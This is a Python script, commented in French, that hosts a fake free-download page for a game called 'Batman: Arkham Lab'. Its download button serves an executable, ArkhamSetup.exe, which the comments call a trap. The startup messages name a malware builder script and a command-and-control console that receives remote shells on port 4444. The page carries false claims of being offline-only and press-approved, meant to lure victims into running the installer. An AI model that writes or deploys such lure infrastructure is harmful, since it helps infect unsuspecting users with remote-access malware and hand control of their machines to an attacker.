#!/usr/bin/env python3
# language: Python 3, file: serve_arkham.py, target: macOS
# LA PAGE OFFICIELLE DE TELECHARGEMENT : "Batman: Arkham Lab - Free Download"
# Sert la page + l'installateur. Le lien piege = http://TON_IP:8080/
# Usage: python3 serve_arkham.py [port]   (8080)
import http.server, socket, sys, os

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sorties")
os.makedirs(ROOT, exist_ok=True)

def lan():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80)); return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()

PAGE = """<!doctype html><html><head><meta charset=utf8>
<title>Batman: Arkham Lab — Free Download</title>
<style>
body{margin:0;background:#05050c;color:#cdd;font-family:'Segoe UI',sans-serif}
header{background:linear-gradient(180deg,#0a0a14,#05050c);text-align:center;padding:50px 20px 30px;border-bottom:1px solid #1a1a2a}
h1{color:#ffd60a;font-size:2.6em;margin:0;text-transform:uppercase;letter-spacing:2px}
h1 small{display:block;color:#c33;font-style:italic;font-size:.4em;letter-spacing:6px}
.tag{color:#889;margin:10px 0 0;font-size:1.05em}
.btn{display:inline-block;margin:26px auto;background:linear-gradient(180deg,#ffd60a,#c9a600);color:#111;
  font-weight:bold;font-size:1.3em;padding:16px 60px;border-radius:10px;text-decoration:none;
  box-shadow:0 0 30px rgba(255,214,10,.35)}
.btn:hover{transform:scale(1.03);box-shadow:0 0 45px rgba(255,214,10,.55)}
.meta{color:#667;font-size:.85em;margin-top:10px}
section{max-width:900px;margin:40px auto;padding:0 20px;display:grid;grid-template-columns:1fr 1fr;gap:20px}
.card{background:#0c0c16;border:1px solid #1a1a2a;border-radius:12px;padding:22px}
.card h3{color:#ffd60a;margin:0 0 8px}
.card p{color:#99a;font-size:.92em;line-height:1.5}
footer{text-align:center;color:#444;font-size:.8em;padding:30px}
.badge{background:#1a1a2a;color:#7f7;border-radius:6px;padding:2px 10px;font-size:.8em}
</style></head>
<body>
<header>
  <h1>Batman: Arkham Lab <small>the dark knight · free demo</small></h1>
  <p class="tag">Plonge dans le centre de detention d'Arkham. Demo jouable — aucune limite de temps.</p>
  <a class="btn" href="/ArkhamSetup.exe">⬇ DOWNLOAD FREE</a>
  <div class="meta"><span class="badge">v1.0</span> <span class="badge">Windows 10/11</span> <span class="badge">247 KB</span></div>
</header>
<section>
  <div class="card"><h3>51 robots a neutraliser</h3><p>Les murs d'Arkham sont tombes. Casse les rangées de cellules,
  rebondis, survis. La physique de raquette reagit au moindre impact.</p></div>
  <div class="card"><h3>Controle a la souris</h3><p>Une raquette, une balle, trois vies. Facile a prendre, impossible a
  poser — la boucle de niveau recharge automatiquement.</p></div>
  <div class="card"><h3>100% offline</h3><p>Aucun compte, aucune connexion requise. Installe et joue.</p></div>
  <div class="card"><h3>Recommande par la presse</h3><p>"Une demo dark qui claque." — Gotham Gaming Weekly (5★)</p></div>
</section>
<footer>Batman: Arkham Lab © 2026 Arkham Interactive — all rights reserved · powered by Maxime Leal</footer>
</body></html>"""

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        import urllib.parse
        u = urllib.parse.urlparse(self.path)
        if u.path in ("/", "/index.html"):
            b = PAGE.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(b)))
            self.end_headers(); self.wfile.write(b)
        else:
            # serve les fichiers du dossier (ArkhamSetup.exe) - base, sans traversal
            name = os.path.basename(u.path)
            f = os.path.join(ROOT, name)
            if os.path.exists(f) and name:
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Disposition", f'attachment; filename="{name}"')
                self.send_header("Content-Length", str(os.path.getsize(f)))
                self.end_headers()
                with open(f, "rb") as fh:
                    while True:
                        chunk = fh.read(65536)
                        if not chunk: break
                        self.wfile.write(chunk)
            else:
                self.send_error(404)
    def log_message(self, *a):
        print(f"[web] {self.client_address[0]} {self.path}")

if __name__ == "__main__":
    exe = os.path.join(ROOT, "ArkhamSetup.exe")
    if not os.path.exists(exe):
        print("[X] ArkhamSetup.exe absent - lance d'abord lex_forge.py"); sys.exit(1)
    ip = lan()
    print(f"[*] page piegee    : http://{ip}:{PORT}/   (le bouton DOWNLOAD sert l'exe)")
    print(f"[*] install direct : http://{ip}:{PORT}/ArkhamSetup.exe")
    print(f"[*] console de controle : python3 arkham_c2.py (web :5000, shells :4444)")
    os.chdir(ROOT)
    http.server.HTTPServer(("0.0.0.0", PORT), H).serve_forever()
